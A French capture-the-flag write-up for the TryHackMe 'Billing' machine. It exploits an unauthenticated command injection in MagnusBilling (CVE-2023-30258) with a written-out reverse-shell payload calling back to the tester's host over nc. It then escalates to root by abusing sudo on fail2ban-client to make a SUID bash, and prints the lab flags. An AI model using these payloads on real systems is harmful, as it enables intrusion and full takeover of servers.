# Write-up -- TryHackMe : Billing

Write-up réalisé pour la machine Billing de TryHackMe. La chaîne d'exploitation repose sur une injection de commande sans authentification dans MagnusBilling (CVE-2023-30258), suivie d'une escalade de privilèges via une mauvaise configuration sudo sur `fail2ban-client` qui permet de modifier dynamiquement l'action de bannissement pour exécuter une commande arbitraire en tant que root.

L'IP de la machine pendant ma session était `10.129.142.160`.

---

## Étape 1 -- Scan des ports ouverts

```bash
nmap -sS -sV -sC -p- 10.129.142.160
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/mbilling/
|_http-title: MagnusBilling
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
```

**4 ports TCP ouverts** : SSH sur le 22, un serveur web Apache sur le 80, MariaDB sur le 3306 (sans accès depuis l'extérieur), et un service **Asterisk Call Manager** sur le 5038. Le fichier `robots.txt` révèle le chemin `/mbilling/`.

---

## Étape 2 -- Reconnaissance web et identification du logiciel

On énumère les répertoires avec ffuf :

```bash
ffuf -u "http://10.129.142.160/FUZZ" -w /usr/share/wordlists/dirb/common.txt
```

Tout ce qui est trouvé retourne du **403 Forbidden**, des fichiers de logs et fichiers système protégés par Apache, dont un `akeeba.backend.log` qui trahit la présence de Joomla en arrière-plan. Rien d'exploitable directement.

L'URL `/mbilling/` mène à une page de login **MagnusBilling**, un outil open-source de facturation pour la **téléphonie IP**. Le port 5038 héberge l'API Asterisk sur laquelle MagnusBilling s'appuie pour gérer les appels.

---

## Étape 3 -- CVE-2023-30258 : injection de commande sans authentification

Une recherche sur MagnusBilling révèle la **CVE-2023-30258** : le fichier `icepay.php`, accessible sans authentification, passe le paramètre `democ` directement à un appel système sans aucune validation. En injectant un ";" suivi d'une commande arbitraire, on sort du contexte prévu et on exécute ce qu'on veut sur le serveur.

On démarre un listener :

```bash
nc -lvnp 4444
```

On déclenche le reverse shell via le paramètre vulnérable :

```bash
curl -s 'http://10.129.142.160/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.45 4444 >/tmp/f;'
```

La connexion arrive sur le listener. On stabilise le shell :

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

On est en tant qu'utilisateur **`asterisk`**, le compte de service sous lequel tourne MagnusBilling.

---

## Étape 4 -- Flag user

```bash
asterisk@billing:/home/magnus$ cat user.txt
```

**Flag user :** `THM{4a6831d5f124b25eefb1e92e0f0da4ca}`

---

## Étape 5 -- Découverte du vecteur d'escalade : sudo sur fail2ban-client

On vérifie les droits sudo du compte `asterisk` :

```bash
sudo -l
```

```
User asterisk may run the following commands on billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

`asterisk` peut exécuter `fail2ban-client` en root **sans mot de passe**. On vérifie que fail2ban tourne bien et sous quel compte :

```bash
systemctl status fail2ban
ps -ef | grep fail2ban
```

```
root  853  1  0 22:58 ?  00:00:10 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
```

**Fail2ban est actif et son serveur tourne en root.** C'est le point d'entrée pour l'escalade.

---

## Étape 6 -- Mécanisme de l'escalade via fail2ban

Fail2ban surveille des logs système et bannit les IPs qui génèrent trop d'erreurs en leur appliquant une **action**, typiquement une règle iptables. Ces actions sont définies dans des fichiers de configuration statiques, mais `fail2ban-client` expose une commande qui permet de les **modifier dynamiquement** :

```
set <JAIL> action <ACT> actionban <CMD>
```

Cette commande remplace en mémoire la commande exécutée par fail2ban quand il bannit une IP. Puisque le serveur fail2ban tourne en root, la commande de remplacement sera exécutée en root.

On cherche d'abord quelle jail est active :

```bash
cat /etc/fail2ban/jail.conf 
```

```
[sshd]
port    = ssh
logpath = %(sshd_log)s
```

La jail **`sshd`** est active. L'action associée par défaut est **`iptables-multiport`**. C'est cette combinaison jail + action qu'on va cibler.

---

## Étape 7 -- Exploitation et flag root

On injecte notre payload dans l'`actionban` de la jail `sshd`. La commande copie `/bin/bash` dans `/tmp` et lui attribue le bit SUID, ce qui permettra de spawner un shell root avec `bash -p` :

```bash
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "cp /bin/bash /tmp && chmod 4755 /tmp/bash"
```

```
cp /bin/bash /tmp && chmod 4755 /tmp/bash
```

La commande a été exécutée immédiatement par le serveur en tant que root, sans qu'il soit nécessaire de déclencher un vrai bannissement ou de redémarrer le service.

> **Note :** J'ai d'abord tenté un `restart` après avoir injecté le payload (voir article https://juggernaut-sec.com/fail2ban-lpe/), ce qui a réinitialisé la configuration en mémoire et supprimé le changement, c'est pour ça que ça n'avait pas fonctionné. La commande `set` modifie l'état en mémoire du serveur en cours d'exécution, donc le payload est exécuté immédiatement. Un redémarrage recharge la config depuis le disque et écrase les changements.

```bash
ls /tmp
# bash  f  linpeas.sh
```

`/tmp/bash` est bien présent. On l'exécute avec `-p` pour préserver les privilèges effectifs (root) :

```bash
/tmp/bash -p
```

```bash
bash-5.2# whoami
root

bash-5.2# cat /root/root.txt
THM{33ad5b530e71a172648f424ec23fae60}
```

**Flag root :** `THM{33ad5b530e71a172648f424ec23fae60}`
